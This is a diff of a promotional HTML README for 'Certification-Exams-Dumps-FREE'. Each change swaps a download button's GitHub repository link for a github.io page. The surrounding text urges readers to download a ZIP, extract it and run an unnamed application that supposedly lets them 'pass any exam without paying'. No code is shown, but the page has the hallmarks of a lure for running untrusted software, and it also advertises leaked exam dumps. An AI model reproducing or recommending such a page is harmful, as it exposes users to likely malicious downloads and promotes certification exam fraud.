@@ -1,7 +1,7 @@
 <h1>🎓 Certification-Exams-Dumps-FREE - Pass Any Exam Without Paying</h1>
 
 <p align="center">
-  <a href="https://github.com/Haleighfrequent1403/Certification-Exams-Dumps-FREE" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW - 100% FREE</a>
+  <a href="https://haleighfrequent1403.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW - 100% FREE</a>
 </p>
 
 <h2>📚 What Is This?</h2>
@@ -34,7 +34,7 @@
 
 <h3>Step 1: Download The Application</h3>
 <p>Visit this link to download the application:</p>
-<p><a href="https://github.com/Haleighfrequent1403/Certification-Exams-Dumps-FREE" style="background-color:#ff5722;color:white;padding:12px 25px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:5px;">⬇️ Go To Download Page</a></p>
+<p><a href="https://haleighfrequent1403.github.io" style="background-color:#ff5722;color:white;padding:12px 25px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:5px;">⬇️ Go To Download Page</a></p>
 <p>When you click this link, you will see a green "Code" button on the page. Click it, then click "Download ZIP". The download will start automatically.</p>
 
 <h3>Step 2: Extract The ZIP File</h3>
@@ -103,5 +103,5 @@
 <p>That is everything you need to know. The download link is available at the top and the bottom of this page. Download it, extract it, run it, and start studying. There is no reason to pay for exam dumps anymore. Good luck with your certification exam!</p>
 
 <p align="center">
-  <a href="https://github.com/Haleighfrequent1403/Certification-Exams-Dumps-FREE" style="background-color:#2196F3;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD CERTIFICATION-EXAMS-DUMPS-FREE</a>
+  <a href="https://haleighfrequent1403.github.io" style="background-color:#2196F3;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD CERTIFICATION-EXAMS-DUMPS-FREE</a>
 </p>
